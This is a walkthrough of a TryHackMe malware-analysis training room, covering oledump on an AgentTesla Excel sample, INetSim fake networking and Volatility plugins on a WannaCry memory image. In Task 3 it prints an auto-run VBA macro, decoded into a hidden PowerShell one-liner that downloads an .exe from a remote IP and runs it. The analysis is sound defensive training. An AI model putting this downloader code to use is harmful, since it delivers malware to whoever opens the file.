# REMnux: Getting Started

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: -
Subscription type: Premium
Description: Learn how you can use the tools inside the REMnux VM.
```

Room link: [https://tryhackme.com/room/remnuxgettingstarted](https://tryhackme.com/room/remnuxgettingstarted)

## Solution

### Task 1 - Introduction

Analysing potentially malicious software can be daunting, especially when this is part of an ongoing security incident. This analysis puts much pressure on the analyst. Most of the time, the results must be as accurate as possible, and analysts use different tools, machines, and environments to achieve this. In this room, we will use the REMnux VM.

The REMnux VM is a specialised Linux distro. It already includes tools like Volatility, YARA, Wireshark, oledump, and INetSim. It also provides a sandbox-like environment for dissecting potentially malicious software without risking your primary system. It's your lab set up and ready to go without the hassle of manual installations.

#### Learning Objectives

- Explore the tools inside the REMnux VM
- Learn how to use tools to analyse potentially malicious documents effectively
- Learn how to simulate a fake network to aid in the analysis
- Be familiar with the tools used to analyse memory images

#### Room Prerequisites

Familiarity with the CyberChef tool is recommended but not mandatory before starting the course. You can check the room associated with it.

- [CyberChef: The Basics](https://tryhackme.com/jr/cyberchefbasics)

### Task 2 - Machine Access

We will use the AttackBox and the attached virtual machine in this room. To start the REMnux virtual machine, click the green **Start Machine** button.

The machine will start in a split-screen view and might take 2-3 minutes to boot up. It is expected to have the an output similar to the image below.

### Task 3 - File Analysis

In this task, we will use `oledump.py` to conduct static analysis on a potentially malicious Excel document.

`Oledump.py` is a Python tool that analyzes **OLE2** files, commonly called Structured Storage or Compound File Binary Format. **OLE** stands for **Object Linking and Embedding**, a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

Let's start!

Using the virtual machine attached to task 2, the REMnux VM, navigate to the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. Our target file is named `agenttesla.xlsm`. Run the command `oledump.py agenttesla.xlsm`. See the terminal below.

```bash
ubuntu@10.10.180.204:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

Based on OleDump's file analysis, a VBA script might be embedded in the document and found inside `xl/vbaProject.bin`. Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index)+Numbers are called **data streams**.

Now, we should be aware of the data stream with the capital letter **M**. This means there is a **Macro**, and you might want to check out this data stream, `'VBA/ThisWorkbook'`.

So, let's check it out! Let's run the command `oledump.py agenttesla.xlsm -s 4`. This command will run the oledump and look into the actual data stream of interest using the parameter `-s 4`, wherein the `-s` parameter is short for `-select` and the number four (4) as the data stream of interest is in the 4th place(`A4: M   688 'VBA/ThisWorkbook'`)

```bash
ubuntu@10.10.180.204:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
```

The results above are in hex dump format. There might be some familiar words from a trained eye. However, this is still challenging for us, don't you think? So, let's make it more readable and easier to understand.

We will run an additional parameter `--vbadecompress` in addition to the previous command. When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format, making it easier to analyze the contents of the macros.

```bash
ubuntu@ip-10-10-180-204:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
End Sububuntu@ip-10-10-180-204:~/Desktop/tasks/agenttesla$ 
```

This is much better, isn't it?

Now, we don't need to be able to read the whole script but rather familiarize ourselves with some characters and commands. Our interest here would be the value of **Sqtnew** because if you check the script, there is a Public IP, a PDF, and a .exe inside. We might want to look into this further.

```text
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
```

We will copy the first value of **Sqtnew** and paste it into **CyberChef**'s input area. You can open a local copy of CyberChef inside the REMnux VM or go to [this link](https://gchq.github.io/CyberChef/) to access the online version. Use whichever works for you. You might want to check our room about CyberChef to get more familiar with the tool.

Next, select the **Find/Replace** operation twice. Looking back at the script, the 2nd and 3rd values of Sqtnew have a command to replace `*` with `""` and `^` with `""`. We would assume that the `""` means there is no value. So, with our first operation selected, we put the value `*` and selected **SIMPLE STRING** as additional parameters. In contrast, we did not put anything on the Replace box or have any value.  The same applies to our second operation: we put the value `^` and selected **SIMPLE STRING**, and the replace box has no value. See the image below.

![Find and Replace in CyberChef](Images/Find_and_Replace_in_CyberChef.png)

Now, this is more readable! However, for our starters, this can be challenging. So, we will tackle the most basic commands here.

```powershell
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

Let's break it down!

- So, in PowerShell, running the `-WindowStyle` parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, `hidden` means that the PowerShell window **won’t be visible to the user**.
- By default, PowerShell restricts script execution for security reasons. The `-executionpolicy` parameter allows you to override this policy. The `bypass` means that the **execution policy is temporarily ignored**, allowing any script to run without restriction.
- The `Invoke-WebRequest` is commonly used for downloading files from the internet.
  - The `-Uri` Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/`.
  - The `-OutFile` specifies the local file where the downloaded content will be saved. In this case, the `Doc-3737122pdf.exe` will be saved to $TempFile.
- The `Start-Process` is used to execute the downloaded file that is stored in `$TempFile` after the web request.

To summarize, when the document `agenttesla.xlsm` is opened, a Macro will run! This Macro contains a VBA script. The script will run and will be running a PowerShell to download a file named `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/`, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (`Doc-3737122pdf.exe`). This is a usual technique used by threat actors to avoid early detection. Pretty nasty, right?!

Kudos to you for figuring it out!

---------------------------------------------------------------------------------------

#### What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?

Answer: `oledump.py`

#### What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?

Answer: `-s`

#### During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?

Answer: `Invoke-WebRequest`

#### What file was being downloaded using the PowerShell script?

Answer: `Doc-3737122pdf.exe`

#### During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?

Answer: `$TempFile`

#### Using the tool, scan another file named possible_malicious.docx located in the /home/ubuntu/Desktop/tasks/agenttesla/ directory. How many data streams were presented for this file?

```bash
ubuntu@ip-10-10-180-204:~/Desktop/tasks/agenttesla$ oledump.py possible_malicious.docx 
  1:       114 '\x01CompObj'
  2:       280 '\x05DocumentSummaryInformation'
  3:       416 '\x05SummaryInformation'
  4:      7557 '1Table'
  5:    343998 'Data'
  6:       376 'Macros/PROJECT'
  7:        41 'Macros/PROJECTwm'
  8: M 1989192 'Macros/VBA/ThisDocument'
  9:      4099 'Macros/VBA/_VBA_PROJECT'
 10:       515 'Macros/VBA/dir'
 11:       112 'ObjectPool/_1649178531/\x01CompObj'
 12:        16 'ObjectPool/_1649178531/\x03OCXNAME'
 13:         6 'ObjectPool/_1649178531/\x03ObjInfo'
 14:        86 'ObjectPool/_1649178531/f'
 15:         0 'ObjectPool/_1649178531/o'
 16:      4096 'WordDocument'
```

Answer: `16`

#### Using the tool, scan another file named possible_malicious.docx located in the /home/ubuntu/Desktop/tasks/agenttesla/ directory. At what data stream number does the tool indicate a macro present?

Answer: `8`

### Task 4 - Fake Network to Aid Analysis

During dynamic analysis, it is essential to observe the behaviour of potentially malicious software—especially its network activities. There are many approaches to this. We can create a whole infrastructure, a virtual environment with different core machines, and more. Alternatively, there is a tool inside our REMnux VM called **INetSim: Internet Services Simulation Suite!**

We will utilize INetSim's features to simulate a real network in this task.

#### Virtual Machines

For this task, we will use two (2) machines. The first is our REMnux machine, which is linked to the Machine Access Task. The second VM is the AttackBox. To start the AttackBox, click the blue **Start AttackBox** button at the top of the page. Do note that you can easily switch between boxes by clicking on them.

#### INetSim

Before we start, we must configure the tool INetSim inside our REMnux VM. Do not worry; this is a simple change of configuration. First, check the IP address assigned to your machine. This can be seen using the command `ifconfig` or simply by checking the IP address after the **ubuntu@** from the terminal. The IP addresses may vary.

```bash
ubuntu@10.10.180.204:~$
```

Here, the machine’s IP is `10.10.180.204`. Take note of this, as we will need it.

Next, we need to change the INetSim configuration by running this command `sudo nano /etc/inetsim/inetsim.conf` and look for the value `#dns_default_ip 0.0.0.0`.

```bash
ubuntu@10.10.180.204:~$ sudo nano /etc/inetsim/inetsim.conf
#########################################
# dns_default_ip
#
# Default IP address to return with DNS replies
#
# Syntax: dns_default_ip 
#
# Default: 127.0.0.1
#
#dns_default_ip  0.0.0.0
```

Remove the comment or **#**, then change the value of dns_default_ip from `0.0.0.0` to the machine’s IP address you have identified earlier. In our case, this is `10.10.180.204`. Save the file using `CRTL + O` command, press `Enter` and exit using `CTRL + X`.

Confirm that the changes have been successful by checking the value of dns_default_ip using this command cat /etc/inetsim/inetsim.conf | grep dns_default_ip. See below.

```bash
ubuntu@10.10.180.204:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip
# dns_default_ip
# Syntax: dns_default_ip 
dns_default_ip    10.10.180.204
```

Finally, run the command `sudo inetsim` to start the tool.

```bash
ubuntu@ip-10-10-180-204:~$ sudo inetsim 
INetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg
Using log directory:      /var/log/inetsim/
Using data directory:     /var/lib/inetsim/
Using report directory:   /var/log/inetsim/report/
Using configuration file: /etc/inetsim/inetsim.conf
Parsing configuration file.
Configuration file parsed successfully.
=== INetSim main process started (PID 2336) ===
Session ID:     2336
Listening on:   0.0.0.0
Real Date/Time: 2025-05-02 17:17:41
Fake Date/Time: 2025-05-02 17:17:41 (Delta: 0 seconds)
 Forking services...
Couldn't create UDP socket: Address already in use at /usr/share/perl5/INetSim/DNS.pm line 36.
  * dns_53_tcp_udp - started (PID 2341)
  * ftp_21_tcp - started (PID 2348)
  * pop3s_995_tcp - started (PID 2347)
  * smtps_465_tcp - started (PID 2345)
  * ftps_990_tcp - started (PID 2349)
  * smtp_25_tcp - started (PID 2344)
  * http_80_tcp - failed!
  * https_443_tcp - started (PID 2343)
  * pop3_110_tcp - started (PID 2346)
 done.
Simulation running.

```

After running the command, ensure you see the sentence "**Simulation running**" at the bottom of the result and ignore the **http_80_tcp—failed!** Our fake network is now running!

Let's move on to our AttackBox!

#### AttackBox

From this VM, open a browser and go to our REMnux's IP address using the command `https://10.10.180.204`. This will prompt a Security Risk; ignore it, click **Advanced...**, then **Accept the Risk and Continue**.

Once done, you should be redirected to the INetSim's homepage!

```text
This is the default HTML page for INetSim HTTP server fake mode.

This file is an HTML document.
```

One usual malware behaviour is downloading another binary or script. We will try to mimic this behaviour by getting another file from INetsim. We can do this via the CLI or browser, but let's use the CLI to make it more realistic. Use this command: `sudo wget https://10.10.180.204/second_payload.zip --no-check-certificate`.

```bash
root@10.10.180.204:~# sudo wget https://10.10.180.204/second_payload.zip --no-check-certificate
--2024-09-22 22:18:49--  https://10.10.180.204/second_payload.zip
Connecting to 10.10.180.204:443... connected.
WARNING: cannot verify 10.10.180.204's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u2018MACHINE_IP\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018second_payload.zip\u2019

second_payload.zip  100%[===================>]     258  --.-KB/s    in 0s      

2024-09-22 22:18:49 (14.5 MB/s) - \u2018second_payload.zip\u2019 saved [258/258]
```

You can try downloading another file as well. For example, try downloading `second_payload.ps1` by using the command: `sudo wget https://10.10.180.204/second_payload.ps1 --no-check-certificate`.

To verify that the files were downloaded, check your root folder.

All of these are fake files! Try to open the `second_payload.ps1`. When executed, this will direct you to INetSim's homepage.

```bash
root@ip-10-10-176-182:~# cat second_payload.ps1 
<html>
  <head>
    <title>INetSim default HTML page</title>
  </head>
  <body>
    <p></p>
    <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
    <p align="center">This file is an HTML document.</p>
  </body>
</html>
root@ip-10-10-176-182:~# 
```

What we did here is **mimic a malware's behaviour**, wherein it will try to reach out to a server or URL and then **download a secondary file that may contain another malware**.

#### Connection Report

Lastly, go back to your REMnux VM and stop INetSim. By default, it will create a report on its captured connections. This is usually saved in `/var/log/inetsim/report/` directory. You should be able to see something like this.

```bash
<---snip--->
  * smtp_25_tcp - stopped (PID 2344)
  * https_443_tcp - stopped (PID 2343)
  * https_443_tcp - stopped (PID 2343)
Simulation stopped.
Report written to '/var/log/inetsim/report/report.2594.txt' (14 lines)
=== INetSim main process stopped (PID 2594) ===
```

Read the file using this command `sudo cat /var/log/inetsim/report/report.2594.txt`. This may differ from your machine.

```bash
ubuntu@ip-10-10-180-204:~$ ls -l /var/log/inetsim/report
total 60
-r--r----- 1 inetsim inetsim  846 Sep 21  2024 report.103969.txt
-r--r----- 1 inetsim inetsim 4655 Sep 21  2024 report.104035.txt
-r--r----- 1 inetsim inetsim 1078 Sep 21  2024 report.104116.txt
-r--r----- 1 inetsim inetsim 1085 Sep 21  2024 report.104162.txt
-r--r----- 1 inetsim inetsim 2111 Sep 21  2024 report.104214.txt
-r--r----- 1 inetsim inetsim  767 Sep 21  2024 report.104328.txt
-r--r----- 1 inetsim inetsim 1122 Sep 21  2024 report.104513.txt
-r--r----- 1 inetsim inetsim  576 Sep 21  2024 report.104736.txt
-r--r----- 1 inetsim inetsim 1826 Sep 21  2024 report.104904.txt
-r--r----- 1 inetsim inetsim 5848 Sep 21  2024 report.105010.txt
-r--r----- 1 inetsim inetsim  871 May  2 17:25 report.2336.txt
-r--r----- 1 inetsim inetsim 1596 Sep 22  2024 report.2424.txt
-r--r----- 1 inetsim inetsim  871 Sep 22  2024 report.2594.txt
ubuntu@ip-10-10-180-204:~$ sudo cat /var/log/inetsim/report/report.2336.txt 
=== Report for session '2336' ===

Real start date            : 2025-05-02 17:17:41
Simulated start date       : 2025-05-02 17:17:41
Time difference on startup : none

2025-05-02 17:20:27  First simulated date in log file
2025-05-02 17:20:27  HTTPS connection, method: GET, URL: https://10.10.180.204/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-05-02 17:20:27  HTTPS connection, method: GET, URL: https://10.10.180.204/favicon.ico, file name: /var/lib/inetsim/http/fakefiles/favicon.ico
2025-05-02 17:22:08  HTTPS connection, method: GET, URL: https://10.10.180.204/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-05-02 17:23:04  HTTPS connection, method: GET, URL: https://10.10.180.204/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-05-02 17:23:04  Last simulated date in log file

===
ubuntu@ip-10-10-180-204:~$ 
```

These are the logs when the tool was running. We can see the connections made to the URL, the protocol, and the method it's using. We can also see the fake file that was downloaded.

---------------------------------------------------------------------------------------

Download and scan the file named flag.txt from the terminal using the command `sudo wget https://10.10.180.204/flag.txt --no-check-certificate`

#### What is the flag?

Make sure INetSim is running and download with curl

```bash
root@ip-10-10-176-182:~# curl -k https://10.10.180.204/flag.txt

This is the default text document for INetSim HTTP server fake mode.

This file is plain text.

You found it! The flag is = Tryhackme{<REDACTED>}
```

Answer: `Tryhackme{<REDACTED>}`

#### After stopping the inetsim, read the generated report. Based on the report, what URL Method was used to get the file flag.txt?

```bash
ubuntu@ip-10-10-180-204:~$ sudo cat /var/log/inetsim/report/report.2444.txt 
=== Report for session '2444' ===

Real start date            : 2025-05-02 17:32:50
Simulated start date       : 2025-05-02 17:32:50
Time difference on startup : none

2025-05-02 17:33:24  First simulated date in log file
2025-05-02 17:33:24  HTTPS connection, method: GET, URL: https://10.10.180.204/flag.txt, file name: /var/lib/inetsim/http/fakefiles/sample.txt
2025-05-02 17:33:40  HTTPS connection, method: GET, URL: https://10.10.180.204/flag.txt, file name: /var/lib/inetsim/http/fakefiles/sample.txt
2025-05-02 17:33:40  Last simulated date in log file

===
```

Answer: `GET`

### Task 5 - Memory Investigation: Evidence Preprocessing

One of the most common investigative practices in Digital Forensics is the preprocessing of evidence. This involves running tools and saving the results in text or JSON format. The analyst often relies on tools such as Volatility when dealing with memory images as evidence. This tool is already included in the REMnux VM. Volatility commands are executed to identify and extract specific artefacts from memory images, and the resulting output can be saved to text files for further examination. Similarly, we can run a script involving the tool's different parameters to preprocess the acquired evidence faster.

#### Preprocessing With Volatility

In this task, we will use the Volatility 3 tool version. However, we won’t go deep into the investigation and analysis part of the result—we could write a whole book about it! Instead, we want you to be familiar with and get a feel for how the tool works. Run the command as instructed and wait for the result to show. Each plugin takes 2-3 minutes to show the output.

Here are some of the parameters or plugins we will use. We will focus on Windows plugins.

- windows.pstree.PsTree
- windows.pslist.PsList
- windows.cmdline.CmdLine
- windows.filescan.FileScan
- windows.dlllist.DllList
- windows.malfind.Malfind
- windows.psscan.PsScan

Let’s get started then!

In your RemnuxVM, run `sudo su`, then navigate to `/home/ubuntu/Desktop/tasks/Wcry_memory_image/` directory, and our file would be wcry.mem. We will run each plugin after the command `vol3 -f wcry.mem`.

#### PsTree

This plugin lists processes in a tree based on their parent process ID.

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.pstree.PsTree
Volatility 3 Framework 2.0.0
Progress:  100.00        PDB scanning finished                        
PID    PPID    ImageFileName    Offset(V)    Threads    Handles    SessionId    Wow64    CreateTime    ExitTime

4    0    System    0x823c8830    51    244    N/A    False    N/A    N/A
* 348    4    smss.exe    0x82169020    3    19    N/A    False    2017-05-12 21:21:55.000000     N/A
** 620    348    winlogon.exe    0x8216e020    23    536    0    False    2017-05-12 21:22:01.000000     N/A
*** 664    620    services.exe    0x821937f0    15    265    0    False    2017-05-12 21:22:01.000000     N/A
**** 1024    664    svchost.exe    0x821af7e8    79    1366    0    False    2017-05-12 21:22:03.000000     N/A
***** 1768    1024    wuauclt.exe    0x81f747c0    7    132    0    False    2017-05-12 21:22:52.000000     N/A
***** 1168    1024    wscntfy.exe    0x81fea8a0    1    37    0    False    2017-05-12 21:22:56.000000     N/A
**** 1152    664    svchost.exe    0x821bea78    10    173    0    False    2017-05-12 21:22:06.000000     N/A
**** 544    664    alg.exe    0x82010020    6    101    0    False    2017-05-12 21:22:55.000000     N/A
**** 836    664    svchost.exe    0x8221a2c0    19    211    0    False    2017-05-12 21:22:02.000000     N/A
**** 260    664    svchost.exe    0x81fb95d8    5    105    0    False    2017-05-12 21:22:18.000000     N/A
**** 904    664    svchost.exe    0x821b5230    9    227    0    False    2017-05-12 21:22:03.000000     N/A
**** 1484    664    spoolsv.exe    0x821e2da0    14    124    0    False    2017-05-12 21:22:09.000000     N/A
**** 1084    664    svchost.exe    0x8203b7a8    6    72    0    False    2017-05-12 21:22:03.000000     N/A
*** 676    620    lsass.exe    0x82191658    23    353    0    False    2017-05-12 21:22:01.000000     N/A
** 596    348    csrss.exe    0x82161da0    12    352    0    False    2017-05-12 21:22:00.000000     N/A
1636    1608    explorer.exe    0x821d9da0    11    331    0    False    2017-05-12 21:22:10.000000     N/A
* 1956    1636    ctfmon.exe    0x82231da0    1    86    0    False    2017-05-12 21:22:14.000000     N/A
* 1940    1636    tasksche.exe    0x82218da0    7    51    0    False    2017-05-12 21:22:14.000000     N/A
** 740    1940    @WanaDecryptor@    0x81fde308    2    70    0    False    2017-05-12 21:22:22.000000     N/A
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# 
```

#### PsList

This plugin is used to list all currently active processes in the machine.

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.pslist.PsList
Volatility 3 Framework 2.0.0
Progress:  100.00        PDB scanning finished                        
PID    PPID    ImageFileName    Offset(V)    Threads    Handles    SessionId    Wow64    CreateTime    ExitTime    File output

4    0    System    0x823c8830    51    244    N/A    False    N/A    N/A    Disabled
348    4    smss.exe    0x82169020    3    19    N/A    False    2017-05-12 21:21:55.000000     N/A    Disabled
596    348    csrss.exe    0x82161da0    12    352    0    False    2017-05-12 21:22:00.000000     N/A    Disabled
620    348    winlogon.exe    0x8216e020    23    536    0    False    2017-05-12 21:22:01.000000     N/A    Disabled
664    620    services.exe    0x821937f0    15    265    0    False    2017-05-12 21:22:01.000000     N/A    Disabled
676    620    lsass.exe    0x82191658    23    353    0    False    2017-05-12 21:22:01.000000     N/A    Disabled
836    664    svchost.exe    0x8221a2c0    19    211    0    False    2017-05-12 21:22:02.000000     N/A    Disabled
904    664    svchost.exe    0x821b5230    9    227    0    False    2017-05-12 21:22:03.000000     N/A    Disabled
1024    664    svchost.exe    0x821af7e8    79    1366    0    False    2017-05-12 21:22:03.000000     N/A    Disabled
1084    664    svchost.exe    0x8203b7a8    6    72    0    False    2017-05-12 21:22:03.000000     N/A    Disabled
1152    664    svchost.exe    0x821bea78    10    173    0    False    2017-05-12 21:22:06.000000     N/A    Disabled
1484    664    spoolsv.exe    0x821e2da0    14    124    0    False    2017-05-12 21:22:09.000000     N/A    Disabled
1636    1608    explorer.exe    0x821d9da0    11    331    0    False    2017-05-12 21:22:10.000000     N/A    Disabled
1940    1636    tasksche.exe    0x82218da0    7    51    0    False    2017-05-12 21:22:14.000000     N/A    Disabled
1956    1636    ctfmon.exe    0x82231da0    1    86    0    False    2017-05-12 21:22:14.000000     N/A    Disabled
260    664    svchost.exe    0x81fb95d8    5    105    0    False    2017-05-12 21:22:18.000000     N/A    Disabled
740    1940    @WanaDecryptor@    0x81fde308    2    70    0    False    2017-05-12 21:22:22.000000     N/A    Disabled
1768    1024    wuauclt.exe    0x81f747c0    7    132    0    False    2017-05-12 21:22:52.000000     N/A    Disabled
544    664    alg.exe    0x82010020    6    101    0    False    2017-05-12 21:22:55.000000     N/A    Disabled
1168    1024    wscntfy.exe    0x81fea8a0    1    37    0    False    2017-05-12 21:22:56.000000     N/A    Disabled
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# 
```

#### CmdLine

This plugin is used to list process command line arguments.

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.cmdline.CmdLine
Volatility 3 Framework 2.0.0
Progress:  100.00        PDB scanning finished                        
PID    Process    Args

4    System    Required memory at 0x10 is not valid (process exited?)
348    smss.exe    \SystemRoot\System32\smss.exe
596    csrss.exe    C:\WINDOWS\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16
620    winlogon.exe    winlogon.exe
664    services.exe    C:\WINDOWS\system32\services.exe
676    lsass.exe    C:\WINDOWS\system32\lsass.exe
836    svchost.exe    C:\WINDOWS\system32\svchost -k DcomLaunch
904    svchost.exe    C:\WINDOWS\system32\svchost -k rpcss
1024    svchost.exe    C:\WINDOWS\System32\svchost.exe -k netsvcs
1084    svchost.exe    C:\WINDOWS\system32\svchost.exe -k NetworkService
1152    svchost.exe    C:\WINDOWS\system32\svchost.exe -k LocalService
1484    spoolsv.exe    C:\WINDOWS\system32\spoolsv.exe
1636    explorer.exe    C:\WINDOWS\Explorer.EXE
1940    tasksche.exe    "C:\Intel\ivecuqmanpnirkt615\tasksche.exe" 
1956    ctfmon.exe    "C:\WINDOWS\system32\ctfmon.exe" 
260    svchost.exe    C:\WINDOWS\system32\svchost.exe -k LocalService
740    @WanaDecryptor@    @WanaDecryptor@.exe
1768    wuauclt.exe    "C:\WINDOWS\system32\wuauclt.exe" /RunStoreAsComServer Local\[400]SUSDS81a6658cb72fa845814e75cca9a42bf2
544    alg.exe    C:\WINDOWS\System32\alg.exe
1168    wscntfy.exe    C:\WINDOWS\system32\wscntfy.exe
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# 
```

#### FileScan

This plugin scans for file objects in a particular Windows memory image. The results have more than 1,400 lines.

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.filescan.FileScan
Volatility 3 Framework 2.0.0
Progress:  100.00        PDB scanning finished                        
Offset    Name    Size

0x1f40310    \Endpoint    112
0x1f65718    \Endpoint    112
0x1f66cd8    \WINDOWS\system32\wbem\wmipcima.dll    112
0x1f67198    \WINDOWS\Prefetch\TASKDL.EXE-01687054.pf    112
0x1f67a70    \WINDOWS\system32\security.dll    112
0x1f67c68    \boot.ini    112
0x1f67ef8    \WINDOWS\system32\cfgmgr32.dll    112
0x1f684d0    \WINDOWS\system32\wbem\framedyn.dll    112
0x1f686d8    \WINDOWS\system32\wbem\cimwin32.dll    112
0x1f6a7f0    \WINDOWS\system32\kmddsp.tsp    112
0x1f6ae20    \$Directory    112
0x1f6b9b0    \$Directory    112
0x1f6bbf8    \$Directory    112
0x1f6bdc8    \PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER    112
0x1f6be60    \WINDOWS\win.ini    112
0x1f6bf90    \$Directory    112
0x1f6c2a8    \$Directory    112
0x1f6c3b8    \$Directory    112
0x1f6cea0    \$Directory    112
0x1f6d158    \lsass    112
0x1f6d4a8    \$Directory    112
0x1f6dba8    \$Directory    112
0x1f6e188    \$Directory    112
0x1f6e6a0    \$Directory    112
0x1f70708    \WINDOWS\system32\rastapi.dll    112
0x1f71190    \$Directory    112
0x1f71b88    \WINDOWS\system32\wbem\Logs\wbemess.log    112
0x1f72f90    \$Directory    112
0x1f732b0    \WINDOWS\system32\uniplat.dll    112
0x1f735d8    \$Directory    112
0x1f753d8    \WINDOWS\system32    112
0x1f75888    \$Directory    112
0x1f75ba8    \$Directory    112
0x1f75df0    \$Directory    112
0x1f761a8    \$Directory    112
0x1f76368    \$Directory    112
0x1f769e0    \$Directory    112
0x1f76b10    \$Directory    112
0x1f76e58    \Documents and Settings\All Users\Start Menu\desktop.ini    112
0x1f76f48    \$Directory    112
0x1f77028    \Documents and Settings\donny\Start Menu\Programs\Accessories\Accessibility\desktop.ini    112
<---snip--->
```

#### DllList

This plugin lists the loaded modules in a particular Windows memory image.

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.dlllist.DllList
Volatility 3 Framework 2.0.0
Progress:  100.00        PDB scanning finished                        
PID    Process    Base    Size    Name    Path    LoadTime    File output

348    smss.exe    0x48580000    0xf000    smss.exe    \SystemRoot\System32\smss.exe    N/A    Disabled
348    smss.exe    0x7c900000    0xb2000    ntdll.dll    C:\WINDOWS\system32\ntdll.dll    N/A    Disabled
596    csrss.exe    0x4a680000    0x5000    csrss.exe    \??\C:\WINDOWS\system32\csrss.exe    N/A    Disabled
596    csrss.exe    0x7c900000    0xb2000    ntdll.dll    C:\WINDOWS\system32\ntdll.dll    N/A    Disabled
596    csrss.exe    0x75b40000    0xb000    CSRSRV.dll    C:\WINDOWS\system32\CSRSRV.dll    N/A    Disabled
596    csrss.exe    0x75b50000    0x10000    basesrv.dll    C:\WINDOWS\system32\basesrv.dll    N/A    Disabled
596    csrss.exe    0x75b60000    0x4b000    winsrv.dll    C:\WINDOWS\system32\winsrv.dll    N/A    Disabled
596    csrss.exe    0x77f10000    0x49000    GDI32.dll    C:\WINDOWS\system32\GDI32.dll    N/A    Disabled
596    csrss.exe    0x7c800000    0xf6000    KERNEL32.dll    C:\WINDOWS\system32\KERNEL32.dll    N/A    Disabled
